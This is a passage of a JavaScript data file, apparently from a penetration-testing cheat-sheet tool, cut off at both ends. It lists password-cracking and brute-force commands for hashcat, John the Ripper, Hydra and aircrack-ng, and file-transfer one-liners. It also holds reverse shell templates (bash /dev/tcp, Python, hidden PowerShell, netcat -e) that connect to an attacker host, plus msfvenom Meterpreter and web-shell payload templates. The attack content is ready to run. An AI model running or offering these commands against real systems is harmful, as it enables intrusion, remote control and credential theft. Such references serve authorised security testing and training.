        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/http-status-codes.txt -O status-codes.txt'
    },
    {
        name: 'SecLists - Robots Disallowed',
        category: 'Web',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/robots-disallowed-top1000.txt -O robots-disallowed.txt'
    },
    {
        name: 'RAFT Wordlists',
        category: 'RAFT',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-large-words-lowercase.txt -O raft-lowercase.txt'
    },
    {
        name: 'Dirbuster Wordlists',
        category: 'Dirbuster',
        command: 'sudo apt update && sudo apt install dirbuster -y',
        note: 'Wordlists in /usr/share/dirbuster/wordlists/'
    },
    {
        name: 'Dirb Wordlists',
        category: 'Dirb',
        command: 'sudo apt update && sudo apt install dirb -y',
        note: 'Wordlists in /usr/share/dirb/wordlists/'
    },
    {
        name: 'WFuzz Wordlists',
        category: 'Wfuzz',
        command: 'pip3 install wfuzz',
        note: 'Wordlists included with wfuzz'
    },
    {
        name: 'Gobuster Wordlists',
        category: 'Gobuster',
        command: 'wget https://github.com/danielmiessler/SecLists/archive/master.zip && unzip master.zip',
        note: 'Use SecLists with Gobuster'
    },
    {
        name: 'Crack Station Real Passwords',
        category: 'Credentials',
        command: 'wget https://crackstation.net/files/crackstation-human-only.txt.gz && gunzip crackstation-human-only.txt.gz'
    },
    {
        name: 'BruteX Wordlists',
        category: 'Credentials',
        command: 'git clone https://github.com/1N3/BruteX.git'
    },
    {
        name: 'Kaonashi Wordlists',
        category: 'Credentials',
        command: 'git clone https://github.com/kaonashi-passwords/Kaonashi.git'
    },
    {
        name: 'Cupp - Custom Wordlist Generator',
        category: 'Tools',
        command: 'git clone https://github.com/Mebus/cupp.git',
        note: 'Generate custom wordlists'
    },
    {
        name: 'Wordlistctl',
        category: 'Tools',
        command: 'wget https://raw.githubusercontent.com/BlackArch/wordlistctl/master/wordlistctl',
        note: 'Manage wordlists'
    },
    {
        name: 'Mentalist',
        category: 'Tools',
        command: 'pip3 install mentalist',
        note: 'GUI wordlist generator'
    },
    {
        name: 'CIRT Default Passwords',
        category: 'Credentials',
        command: 'wget https://cirt.net/passwords',
        note: 'Default password database'
    },
    {
        name: 'Router Default Passwords',
        category: 'Credentials',
        command: 'wget https://www.routerpasswords.com',
        note: 'Router default creds'
    }
];

const PASSWORD_CRACKING = [
    // ===== HASHCAT =====
    {
        tool: 'Hashcat',
        useCase: 'NTLM dictionary attack',
        command: 'hashcat -m 1000 -a 0 hashes.txt wordlist.txt'
    },
    {
        tool: 'Hashcat',
        useCase: 'NTLM dictionary attack (rockyou)',
        command: 'hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt'
    },
    {
        tool: 'Hashcat',
        useCase: 'NTLM with rules',
        command: 'hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule'
    },
    {
        tool: 'Hashcat',
        useCase: 'Rule-based wordlist generation',
        command: 'hashcat --force password.list -r custom.rule --stdout > mut_password.list'
    },
    {
        tool: 'Hashcat',
        useCase: 'NetNTLMv2 dictionary attack',
        command: 'hashcat -m 5600 -a 0 netntlmv2.txt wordlist.txt'
    },
    {
        tool: 'Hashcat',
        useCase: 'Kerberoast RC4 (etype 23)',
        command: 'hashcat -m 13100 -a 0 kerberoast.txt wordlist.txt'
    },
    {
        tool: 'Hashcat',
        useCase: 'AS-REP roast RC4 (etype 23)',
        command: 'hashcat -m 18200 -a 0 asrep.txt wordlist.txt'
    },
    {
        tool: 'Hashcat',
        useCase: 'DCC2/MSCache v2 dictionary attack',
        command: 'hashcat -m 2100 -a 0 mscache2.txt wordlist.txt'
    },
    {
        tool: 'Hashcat',
        useCase: 'LM dictionary attack',
        command: 'hashcat -m 3000 -a 0 lm.txt wordlist.txt'
    },
    {
        tool: 'Hashcat',
        useCase: 'Mask brute force',
        command: 'hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a'
    },
    {
        tool: 'Hashcat',
        useCase: 'Hybrid wordlist + mask',
        command: 'hashcat -m 1000 -a 6 hashes.txt wordlist.txt ?d?d'
    },
    {
        tool: 'Hashcat',
        useCase: 'Hybrid mask + wordlist',
        command: 'hashcat -m 1000 -a 7 hashes.txt ?d?d wordlist.txt'
    },
    {
        tool: 'Hashcat',
        useCase: 'Show cracked passwords',
        command: 'hashcat --show -m 1000 hashes.txt'
    },
    {
        tool: 'Hashcat',
        useCase: 'Show cracked result for a single hash',
        command: 'hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show'
    },
    {
        tool: 'Hashcat',
        useCase: 'Resume a session',
        command: 'hashcat --restore --session ntlm_session'
    },
    {
        tool: 'Hashcat',
        useCase: 'Benchmark local hardware',
        command: 'hashcat -b'
    },
    {
        tool: 'Hashcat',
        useCase: 'Hashes with username prefix',
        command: 'hashcat -m 1000 -a 0 hashes.txt wordlist.txt --username'
    },
    {
        tool: 'Hashcat',
        useCase: 'Write cracked output',
        command: 'hashcat -m 1000 -a 0 hashes.txt wordlist.txt --outfile cracked.txt --outfile-format 2'
    },
    {
        tool: 'Hashcat',
        useCase: 'Show status periodically',
        command: 'hashcat -m 1000 -a 0 hashes.txt wordlist.txt --status --status-timer=10'
    },
    {
        tool: 'Hashcat',
        useCase: 'SHA512crypt from unshadowed hashes',
        command: 'hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked'
    },
    {
        tool: 'Hashcat',
        useCase: 'MD5 dictionary attack',
        command: 'hashcat -m 500 -a 0 md5-hashes.list rockyou.txt'
    },
    {
        tool: 'Hashcat',
        useCase: 'BitLocker hash cracking',
        command: 'hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked'
    },
    // ===== JOHN THE RIPPER =====
    {
        tool: 'John the Ripper',
        useCase: 'NTLM dictionary attack',
        command: 'john --format=nt --wordlist=wordlist.txt hashes.txt'
    },
    {
        tool: 'John the Ripper',
        useCase: 'NTLM with rules',
        command: 'john --format=nt --wordlist=wordlist.txt --rules hashes.txt'
    },
    {
        tool: 'John the Ripper',
        useCase: 'NetNTLMv2 dictionary attack',
        command: 'john --format=netntlmv2 --wordlist=wordlist.txt netntlmv2.txt'
    },
    {
        tool: 'John the Ripper',
        useCase: 'Kerberoast RC4 (etype 23)',
        command: 'john --format=krb5tgs --wordlist=wordlist.txt kerberoast.txt'
    },
    {
        tool: 'John the Ripper',
        useCase: 'AS-REP roast RC4 (etype 23)',
        command: 'john --format=krb5asrep --wordlist=wordlist.txt asrep.txt'
    },
    {
        tool: 'John the Ripper',
        useCase: 'DCC2/MSCache v2 dictionary attack',
        command: 'john --format=mscash2 --wordlist=wordlist.txt mscache2.txt'
    },
    {
        tool: 'John the Ripper',
        useCase: 'LM dictionary attack',
        command: 'john --format=lm --wordlist=wordlist.txt lm.txt'
    },
    {
        tool: 'John the Ripper',
        useCase: 'Incremental brute force',
        command: 'john --format=nt --incremental hashes.txt'
    },
    {
        tool: 'John the Ripper',
        useCase: 'Mask attack',
        command: "john --format=nt --mask='?a?a?a?a?a?a?a?a' hashes.txt"
    },
    {
        tool: 'John the Ripper',
        useCase: 'Single crack mode',
        command: 'john --format=nt --single hashes.txt'
    },
    {
        tool: 'John the Ripper',
        useCase: 'Show cracked passwords',
        command: 'john --show --format=nt hashes.txt'
    },
    {
        tool: 'John the Ripper',
        useCase: 'Resume last session',
        command: 'john --restore'
    },
    {
        tool: 'John the Ripper',
        useCase: 'Parallel cracking',
        command: 'john --format=nt --wordlist=wordlist.txt --fork=4 hashes.txt'
    },
    {
        tool: 'John the Ripper',
        useCase: 'Save a named session',
        command: 'john --session=ntlm_session --format=nt --wordlist=wordlist.txt hashes.txt'
    },
    {
        tool: 'John the Ripper',
        useCase: 'Combine passwd and shadow',
        command: 'unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes'
    },
    {
        tool: 'John the Ripper',
        useCase: 'Extract SSH key hash',
        command: 'python3 ssh2john.py SSH.private > ssh.hash'
    },
    {
        tool: 'John the Ripper',
        useCase: 'Crack SSH key hash',
        command: 'john ssh.hash --show'
    },
    {
        tool: 'John the Ripper',
        useCase: 'Extract Office document hash',
        command: 'office2john.py Protected.docx > protected-docx.hash'
    },
    {
        tool: 'John the Ripper',
        useCase: 'Crack Office document hash',
        command: 'john --wordlist=rockyou.txt protected-docx.hash'
    },
    {
        tool: 'John the Ripper',
        useCase: 'Extract PDF hash',
        command: 'pdf2john.pl PDF.pdf > pdf.hash'
    },
    {
        tool: 'John the Ripper',
        useCase: 'Crack PDF hash',
        command: 'john --wordlist=rockyou.txt pdf.hash'
    },
    {
        tool: 'John the Ripper',
        useCase: 'Extract ZIP hash',
        command: 'zip2john ZIP.zip > zip.hash'
    },
    {
        tool: 'John the Ripper',
        useCase: 'Crack ZIP hash',
        command: 'john --wordlist=rockyou.txt zip.hash'
    },
    {
        tool: 'John the Ripper',
        useCase: 'Extract BitLocker hash',
        command: 'bitlocker2john -i Backup.vhd > backup.hashes'
    },
    // ===== HYDRA =====
    {
        tool: 'Hydra',
        useCase: 'Generic service (user list)',
        command: 'hydra -L user.list -P password.list <service>://<ip>'
    },
    {
        tool: 'Hydra',
        useCase: 'Generic service (single user)',
        command: 'hydra -l username -P password.list <service>://<ip>'
    },
    {
        tool: 'Hydra',
        useCase: 'Generic service (single password)',
        command: 'hydra -L user.list -p password <service>://<ip>'
    },
    {
        tool: 'Hydra',
        useCase: 'Credential stuffing (SSH)',
        command: 'hydra -C <user_pass.list> ssh://<IP>'
    },
    {
        tool: 'Hydra',
        useCase: 'SSH user list',
        command: 'hydra -L users.txt -P passwords.txt ssh://<TARGET_IP>'
    },
    {
        tool: 'Hydra',
        useCase: 'SSH single user',
        command: 'hydra -l <USER> -P passwords.txt ssh://<TARGET_IP>'
    },
    {
        tool: 'Hydra',
        useCase: 'RDP user list',
        command: 'hydra -L users.txt -P passwords.txt rdp://<TARGET_IP>'
    },
    {
        tool: 'Hydra',
        useCase: 'SMB user list',
        command: 'hydra -L users.txt -P passwords.txt smb://<TARGET_IP>'
    },
    {
        tool: 'Hydra',
        useCase: 'FTP user list',
        command: 'hydra -L users.txt -P passwords.txt ftp://<TARGET_IP>'
    },
    {
        tool: 'Hydra',
        useCase: 'HTTP basic auth',
        command: 'hydra -L users.txt -P passwords.txt http-get://<TARGET_IP>'
    },
    {
        tool: 'Hydra',
        useCase: 'HTTP POST form',
        command: 'hydra -L users.txt -P passwords.txt <TARGET_IP> http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"'
    },
    {
        tool: 'Hydra',
        useCase: 'MySQL user list',
        command: 'hydra -L users.txt -P passwords.txt mysql://<TARGET_IP>'
    },
    {
        tool: 'Hydra',
        useCase: 'VNC single password list',
        command: 'hydra -P passwords.txt vnc://<TARGET_IP> -V'
    },
    {
        tool: 'Hydra',
        useCase: 'Custom port',
        command: 'hydra -L users.txt -P passwords.txt ssh://<TARGET_IP> -s 2222'
    },
    {
        tool: 'Hydra',
        useCase: 'Stop on first hit',
        command: 'hydra -l <USER> -P passwords.txt ssh://<TARGET_IP> -f'
    },
    {
        tool: 'Hydra',
        useCase: 'Throttle and threads',
        command: 'hydra -L users.txt -P passwords.txt ssh://<TARGET_IP> -t 4 -W 3'
    },
    // ===== AIRCRACK-NG =====
    {
        tool: 'Aircrack-ng',
        useCase: 'WPA/WPA2 dictionary attack',
        command: 'aircrack-ng -w wordlist.txt capture.cap'
    },
    {
        tool: 'Aircrack-ng',
        useCase: 'WPA with BSSID filter',
        command: 'aircrack-ng -w wordlist.txt -b <BSSID> capture.cap'
    },
    {
        tool: 'Aircrack-ng',
        useCase: 'WPA with ESSID filter',
        command: 'aircrack-ng -w wordlist.txt -e <ESSID> capture.cap'
    },
    {
        tool: 'Aircrack-ng',
        useCase: 'Write cracked key to file',
        command: 'aircrack-ng -w wordlist.txt -l cracked.txt capture.cap'
    },
    {
        tool: 'Aircrack-ng',
        useCase: 'WEP cracking',
        command: 'aircrack-ng -a 1 -b <BSSID> capture.cap'
    }
];

const TRANSFER_PROTOCOLS = [{
        name: 'HTTP',
        source: {
            linux: [{
                label: 'Command',
                command: 'python3 -m http.server <SENDER_PORT>'
            }],
            macos: [{
                label: 'Command',
                command: 'python3 -m http.server <SENDER_PORT>'
            }],
            windows: [{
                    label: 'PowerShell',
                    command: 'python -m http.server <SENDER_PORT>'
                },
                {
                    label: 'CMD',
                    command: 'py -3 -m http.server <SENDER_PORT>'
                }
            ]
        },
        destination: {
            linux: [{
                label: 'Command',
                command: 'curl -o <FILENAME> http://<SENDER_IP>:<SENDER_PORT>/<FILENAME>'
            }],
            macos: [{
                label: 'Command',
                command: 'curl -o <FILENAME> http://<SENDER_IP>:<SENDER_PORT>/<FILENAME>'
            }],
            windows: [{
                    label: 'PowerShell',
                    command: 'Invoke-WebRequest -Uri http://<SENDER_IP>:<SENDER_PORT>/<FILENAME> -OutFile <FILENAME>'
                },
                {
                    label: 'CMD',
                    command: 'certutil -urlcache -f http://<SENDER_IP>:<SENDER_PORT>/<FILENAME> <FILENAME>'
                }
            ]
        }
    },
    {
        name: 'PHP',
        source: {
            linux: [{
                label: 'Command',
                command: 'php -S 0.0.0.0:<SENDER_PORT>'
            }],
            macos: [{
                label: 'Command',
                command: 'php -S 0.0.0.0:<SENDER_PORT>'
            }],
            windows: [{
                    label: 'PowerShell',
                    command: 'php -S 0.0.0.0:<SENDER_PORT>'
                },
                {
                    label: 'CMD',
                    command: 'php -S 0.0.0.0:<SENDER_PORT>'
                }
            ]
        },
        destination: {
            linux: [{
                label: 'Command',
                command: 'curl -o <FILENAME> http://<SENDER_IP>:<SENDER_PORT>/<FILENAME>'
            }],
            macos: [{
                label: 'Command',
                command: 'curl -o <FILENAME> http://<SENDER_IP>:<SENDER_PORT>/<FILENAME>'
            }],
            windows: [{
                    label: 'PowerShell',
                    command: 'Invoke-WebRequest -Uri http://<SENDER_IP>:<SENDER_PORT>/<FILENAME> -OutFile <FILENAME>'
                },
                {
                    label: 'CMD',
                    command: 'certutil -urlcache -f http://<SENDER_IP>:<SENDER_PORT>/<FILENAME> <FILENAME>'
                }
            ]
        }
    },
    {
        name: 'Netcat',
        source: {
            linux: [{
                label: 'Command',
                command: 'nc -lvnp <SENDER_PORT> < <FILENAME>'
            }],
            macos: [{
                label: 'Command',
                command: 'nc -lvnp <SENDER_PORT> < <FILENAME>'
            }],
            windows: [{
                    label: 'PowerShell',
                    command: 'ncat.exe -lvnp <SENDER_PORT> < <FILENAME>'
                },
                {
                    label: 'CMD',
                    command: 'ncat.exe -lvnp <SENDER_PORT> < <FILENAME>'
                }
            ]
        },
        destination: {
            linux: [{
                label: 'Command',
                command: 'nc <SENDER_IP> <SENDER_PORT> > <FILENAME>'
            }],
            macos: [{
                label: 'Command',
                command: 'nc <SENDER_IP> <SENDER_PORT> > <FILENAME>'
            }],
            windows: [{
                    label: 'PowerShell',
                    command: 'ncat.exe <SENDER_IP> <SENDER_PORT> | Set-Content -Path <FILENAME>'
                },
                {
                    label: 'CMD',
                    command: 'ncat.exe <SENDER_IP> <SENDER_PORT> > <FILENAME>'
                }
            ]
        }
    },
    {
        name: 'Base64',
        source: {
            linux: [{
                    label: 'Encode',
                    command: 'base64 -w 0 <FILENAME>'
                },
                {
                    label: 'Encode to File',
                    command: 'base64 -w 0 <FILENAME> > <FILENAME>.b64'
                }
            ],
            macos: [{
                    label: 'Encode',
                    command: 'base64 -i <FILENAME>'
                },
                {
                    label: 'Encode to File',
                    command: 'base64 -i <FILENAME> > <FILENAME>.b64'
                }
            ],
            windows: [{
                    label: 'PowerShell',
                    command: '[Convert]::ToBase64String([IO.File]::ReadAllBytes("<FILENAME>"))'
                },
                {
                    label: 'CMD',
                    command: 'certutil -encode <FILENAME> <FILENAME>.b64'
                }
            ]
        },
        destination: {
            linux: [{
                    label: 'Decode',
                    command: 'echo "<BASE64>" | base64 -d > <FILENAME>'
                },
                {
                    label: 'Decode from File',
                    command: 'base64 -d <FILENAME>.b64 > <FILENAME>'
                }
            ],
            macos: [{
                    label: 'Decode',
                    command: 'echo "<BASE64>" | base64 -D > <FILENAME>'
                },
                {
                    label: 'Decode from File',
                    command: 'base64 -D -i <FILENAME>.b64 -o <FILENAME>'
                }
            ],
            windows: [{
                    label: 'PowerShell',
                    command: '[IO.File]::WriteAllBytes("<FILENAME>", [Convert]::FromBase64String("<BASE64>"))'
                },
                {
                    label: 'CMD',
                    command: 'certutil -decode <FILENAME>.b64 <FILENAME>'
                }
            ]
        }
    },
    {
        name: 'Hex',
        source: {
            linux: [{
                    label: 'Encode',
                    command: 'xxd -p <FILENAME> | tr -d \'\\n\''
                },
                {
                    label: 'Encode to File',
                    command: 'xxd -p <FILENAME> > <FILENAME>.hex'
                }
            ],
            macos: [{
                    label: 'Encode',
                    command: 'xxd -p <FILENAME> | tr -d \'\\n\''
                },
                {
                    label: 'Encode to File',
                    command: 'xxd -p <FILENAME> > <FILENAME>.hex'
                }
            ],
            windows: [{
                    label: 'PowerShell',
                    command: '([System.IO.File]::ReadAllBytes("<FILENAME>") | ForEach-Object { $_.ToString("X2") }) -join ""'
                },
                {
                    label: 'CMD',
                    command: 'certutil -encodehex <FILENAME> <FILENAME>.hex'
                }
            ]
        },
        destination: {
            linux: [{
                    label: 'Decode',
                    command: 'echo "<HEX>" | xxd -r -p > <FILENAME>'
                },
                {
                    label: 'Decode from File',
                    command: 'xxd -r -p <FILENAME>.hex > <FILENAME>'
                }
            ],
            macos: [{
                    label: 'Decode',
                    command: 'echo "<HEX>" | xxd -r -p > <FILENAME>'
                },
                {
                    label: 'Decode from File',
                    command: 'xxd -r -p <FILENAME>.hex > <FILENAME>'
                }
            ],
            windows: [{
                    label: 'PowerShell',
                    command: '[IO.File]::WriteAllBytes("<FILENAME>", ([byte[]]("<HEX>" -split "(..)" -ne "" | ForEach-Object { [Convert]::ToByte($_, 16) })))'
                },
                {
                    label: 'CMD',
                    command: 'certutil -decodehex <FILENAME>.hex <FILENAME>'
                }
            ]
        }
    },
    {
        name: 'FTP',
        source: {
            linux: [{
                    label: 'Python',
                    command: 'python3 -m pyftpdlib -p <SENDER_PORT> -w'
                },
                {
                    label: 'vsftpd',
                    command: 'sudo systemctl start vsftpd'
                }
            ],
            macos: [{
                label: 'Python',
                command: 'python3 -m pyftpdlib -p <SENDER_PORT> -w'
            }],
            windows: [{
                label: 'PowerShell',
                command: 'python -m pyftpdlib -p <SENDER_PORT> -w'
            }]
        },
        destination: {
            linux: [{
                    label: 'Command',
                    command: 'ftp <SENDER_IP> <SENDER_PORT>'
                },
                {
                    label: 'wget',
                    command: 'wget ftp://<SENDER_IP>:<SENDER_PORT>/<FILENAME>'
                }
            ],
            macos: [{
                    label: 'Command',
                    command: 'ftp <SENDER_IP> <SENDER_PORT>'
                },
                {
                    label: 'curl',
                    command: 'curl ftp://<SENDER_IP>:<SENDER_PORT>/<FILENAME> -o <FILENAME>'
                }
            ],
            windows: [{
                    label: 'PowerShell',
                    command: 'Invoke-WebRequest -Uri ftp://<SENDER_IP>:<SENDER_PORT>/<FILENAME> -OutFile <FILENAME>'
                },
                {
                    label: 'CMD',
                    command: 'ftp -s:script.txt <SENDER_IP>'
                }
            ]
        }
    },
    {
        name: 'TFTP',
        source: {
            linux: [{
                    label: 'Command',
                    command: 'sudo atftpd --daemon --port <SENDER_PORT> /tmp'
                },
                {
                    label: 'Alternative',
                    command: 'sudo in.tftpd -L -s /tmp'
                }
            ],
            macos: [{
                label: 'Command',
                command: 'sudo launchctl load -w /System/Library/LaunchDaemons/tftp.plist'
            }],
            windows: [{
                label: 'PowerShell',
                command: 'Install-WindowsFeature -Name TFTP-Client'
            }]
        },
        destination: {
            linux: [{
                label: 'Command',
                command: 'tftp <SENDER_IP> -c get <FILENAME>'
            }],
            macos: [{
                label: 'Command',
                command: 'tftp <SENDER_IP> -e get <FILENAME>'
            }],
            windows: [{
                    label: 'PowerShell',
                    command: 'tftp -i <SENDER_IP> GET <FILENAME>'
                },
                {
                    label: 'CMD',
                    command: 'tftp -i <SENDER_IP> GET <FILENAME>'
                }
            ]
        }
    },
    {
        name: 'SCP',
        source: {
            linux: [{
                label: 'Command',
                command: 'scp <FILENAME> <RECEIVER_USER>@<RECEIVER_IP>:/tmp/<FILENAME>'
            }],
            macos: [{
                label: 'Command',
                command: 'scp <FILENAME> <RECEIVER_USER>@<RECEIVER_IP>:/tmp/<FILENAME>'
            }],
            windows: [{
                    label: 'PowerShell',
                    command: 'scp <FILENAME> <RECEIVER_USER>@<RECEIVER_IP>:/tmp/<FILENAME>'
                },
                {
                    label: 'CMD',
                    command: 'scp <FILENAME> <RECEIVER_USER>@<RECEIVER_IP>:/tmp/<FILENAME>'
                }
            ]
        },
        destination: {
            linux: [{
                label: 'Command',
                command: 'scp <SENDER_USER>@<SENDER_IP>:/tmp/<FILENAME> ./'
            }],
            macos: [{
                label: 'Command',
                command: 'scp <SENDER_USER>@<SENDER_IP>:/tmp/<FILENAME> ./'
            }],
            windows: [{
                    label: 'PowerShell',
                    command: 'scp <SENDER_USER>@<SENDER_IP>:/tmp/<FILENAME> .\\'
                },
                {
                    label: 'CMD',
                    command: 'scp <SENDER_USER>@<SENDER_IP>:/tmp/<FILENAME> .\\'
                }
            ]
        }
    },
    {
        name: 'SMB',
        source: {
            linux: [{
                label: 'Command',
                command: 'impacket-smbserver share . -smb2support'
            }],
            macos: [{
                label: 'Command',
                command: 'impacket-smbserver share . -smb2support'
            }],
            windows: [{
                    label: 'PowerShell',
                    command: 'New-SmbShare -Name share -Path C:\\share'
                },
                {
                    label: 'CMD',
                    command: 'net share share=C:\\share'
                }
            ]
        },
        destination: {
            linux: [{
                label: 'Command',
                command: 'smbclient //<SENDER_IP>/share -c "get <FILENAME>"'
            }],
            macos: [{
                label: 'Command',
                command: 'smbclient //<SENDER_IP>/share -c "get <FILENAME>"'
            }],
            windows: [{
                    label: 'PowerShell',
                    command: 'Copy-Item "\\\\<SENDER_IP>\\share\\<FILENAME>" -Destination .'
                },
                {
                    label: 'CMD',
                    command: 'copy \\\\<SENDER_IP>\\share\\<FILENAME> .\\<FILENAME>'
                }
            ]
        }
    },
    {
        name: 'WebDAV',
        source: {
            linux: [{
                    label: 'Command',
                    command: 'wsgidav --host=0.0.0.0 --port=<SENDER_PORT> --root=.'
                },
                {
                    label: 'Alternative',
                    command: 'python3 -m pip install wsgidav cheroot && wsgidav --host=0.0.0.0 --port=<SENDER_PORT> --auth=anonymous --root=.'
                }
            ],
            macos: [{
                label: 'Command',
                command: 'wsgidav --host=0.0.0.0 --port=<SENDER_PORT> --root=.'
            }],
            windows: [{
                    label: 'PowerShell',
                    command: 'wsgidav --host=0.0.0.0 --port=<SENDER_PORT> --root=.'
                },
                {
                    label: 'IIS',
                    command: 'Install-WindowsFeature -Name WebDAV-Redirector'
                }
            ]
        },
        destination: {
            linux: [{
                    label: 'Command',
                    command: 'cadaver http://<SENDER_IP>:<SENDER_PORT>/'
                },
                {
                    label: 'cURL',
                    command: 'curl http://<SENDER_IP>:<SENDER_PORT>/<FILENAME> -o <FILENAME>'
                }
            ],
            macos: [{
                label: 'Command',
                command: 'curl http://<SENDER_IP>:<SENDER_PORT>/<FILENAME> -o <FILENAME>'
            }],
            windows: [{
                    label: 'PowerShell',
                    command: 'Invoke-WebRequest -Uri http://<SENDER_IP>:<SENDER_PORT>/<FILENAME> -OutFile <FILENAME>'
                },
                {
                    label: 'CMD',
                    command: 'net use * http://<SENDER_IP>:<SENDER_PORT> && copy Z:\\<FILENAME> .'
                }
            ]
        }
    }
];

const REVERSE_SHELL_TEMPLATES = {
    bash: {
        label: 'Bash',
        attacker: 'nc -lvnp {{LPORT}}',
        victim: 'bash -c "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1"'
    },
    python: {
        label: 'Python',
        attacker: 'nc -lvnp {{LPORT}}',
        victim: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{{LHOST}}\",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    },
    powershell: {
        label: 'PowerShell',
        attacker: 'nc -lvnp {{LPORT}}',
        victim: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(\'{{LHOST}}\',{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \' ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
    },
    netcat: {
        label: 'Netcat (with -e)',
        attacker: 'nc -lvnp {{LPORT}}',
        victim: 'nc {{LHOST}} {{LPORT}} -e /bin/bash'
    }
};

const MSFVENOM_TEMPLATES = [
    // Windows Payloads
    {
        key: 'windows_meterpreter',
        label: 'Windows x64 Meterpreter (exe)',
        payload: 'windows/x64/meterpreter/reverse_tcp',
        format: 'exe',
        extension: 'exe',
        defaultName: 'payload'
    },
    {
        key: 'windows_meterpreter_https',
        label: 'Windows x64 Meterpreter HTTPS (exe)',
        payload: 'windows/x64/meterpreter/reverse_https',
        format: 'exe',
        extension: 'exe',
        defaultName: 'payload'
    },
    {
        key: 'windows_shell',
        label: 'Windows x64 Shell (exe)',
        payload: 'windows/x64/shell_reverse_tcp',
        format: 'exe',
        extension: 'exe',
        defaultName: 'payload'
    },
    {
        key: 'windows_x86_meterpreter',
        label: 'Windows x86 Meterpreter (exe)',
        payload: 'windows/meterpreter/reverse_tcp',
        format: 'exe',
        extension: 'exe',
        defaultName: 'payload'
    },
    {
        key: 'windows_powershell',
        label: 'Windows PowerShell (cmd)',
        payload: 'windows/x64/meterpreter/reverse_tcp',
        format: 'psh-cmd',
        extension: 'bat',
        defaultName: 'payload'
    },
    {
        key: 'windows_dll',
        label: 'Windows x64 Meterpreter (dll)',
        payload: 'windows/x64/meterpreter/reverse_tcp',
        format: 'dll',
        extension: 'dll',
        defaultName: 'payload'
    },

    // Linux Payloads
    {
        key: 'linux_x64',
        label: 'Linux x64 Shell (elf)',
        payload: 'linux/x64/shell_reverse_tcp',
        format: 'elf',
        extension: 'elf',
        defaultName: 'payload'
    },
    {
        key: 'linux_x86',
        label: 'Linux x86 Shell (elf)',
        payload: 'linux/x86/shell_reverse_tcp',
        format: 'elf',
        extension: 'elf',
        defaultName: 'payload'
    },
    {
        key: 'linux_x64_meterpreter',
        label: 'Linux x64 Meterpreter (elf)',
        payload: 'linux/x64/meterpreter/reverse_tcp',
        format: 'elf',
        extension: 'elf',
        defaultName: 'payload'
    },
    {
        key: 'linux_armle',
        label: 'Linux ARM Shell (elf)',
        payload: 'linux/armle/shell_reverse_tcp',
        format: 'elf',
        extension: 'elf',
        defaultName: 'payload'
    },

    // macOS Payloads
    {
        key: 'macos',
        label: 'macOS x64 Shell (macho)',
        payload: 'osx/x64/shell_reverse_tcp',
        format: 'macho',
        extension: 'macho',
        defaultName: 'payload'
    },
    {
        key: 'macos_meterpreter',
        label: 'macOS x64 Meterpreter (macho)',
        payload: 'osx/x64/meterpreter/reverse_tcp',
        format: 'macho',
        extension: 'macho',
        defaultName: 'payload'
    },

    // Web Payloads
    {
        key: 'php',
        label: 'PHP Reverse TCP (raw)',
        payload: 'php/reverse_php',
        format: 'raw',
        extension: 'php',
        defaultName: 'payload'
    },
    {
        key: 'php_meterpreter',
        label: 'PHP Meterpreter (raw)',
        payload: 'php/meterpreter/reverse_tcp',
        format: 'raw',
        extension: 'php',
        defaultName: 'payload'
    },
    {
        key: 'jsp',
        label: 'JSP Shell (raw)',
        payload: 'java/jsp_shell_reverse_tcp',
        format: 'raw',
        extension: 'jsp',
        defaultName: 'payload'
    },
    {
        key: 'asp',
        label: 'ASP Shell (asp)',
        payload: 'windows/shell/reverse_tcp',
        format: 'asp',
        extension: 'asp',
        defaultName: 'payload'
    },
    {
        key: 'aspx',
        label: 'ASPX Shell (aspx)',
        payload: 'windows/shell/reverse_tcp',
        format: 'aspx',
        extension: 'aspx',
        defaultName: 'payload'
    },
    {
        key: 'python',
        label: 'Python Shell (raw)',
        payload: 'python/shell_reverse_tcp',
        format: 'raw',
        extension: 'py',
        defaultName: 'payload'
    },
    {
        key: 'nodejs',
        label: 'Node.js Shell (raw)',
        payload: 'nodejs/shell_reverse_tcp',
        format: 'raw',
        extension: 'js',
        defaultName: 'payload'
    },

    // Android
    {
        key: 'android',
        label: 'Android Meterpreter (apk)',
        payload: 'android/meterpreter/reverse_tcp',
        format: 'apk',
        extension: 'apk',
        defaultName: 'payload'
    },

    // Java
    {
        key: 'java_jar',
        label: 'Java Shell (jar)',
        payload: 'java/shell_reverse_tcp',
        format: 'jar',
        extension: 'jar',
        defaultName: 'payload'
    },
    {
        key: 'java_war',
        label: 'Java Shell (war)',
        payload: 'java/shell_reverse_tcp',
        format: 'war',
        extension: 'war',
        defaultName: 'payload'
    },

    // Shellcode formats
    {
        key: 'shellcode_c',
        label: 'Shellcode (C format)',
        payload: 'windows/x64/meterpreter/reverse_tcp',
        format: 'c',
        extension: 'c',
        defaultName: 'shellcode'
    },
    {
        key: 'shellcode_python',
        label: 'Shellcode (Python format)',
        payload: 'windows/x64/meterpreter/reverse_tcp',
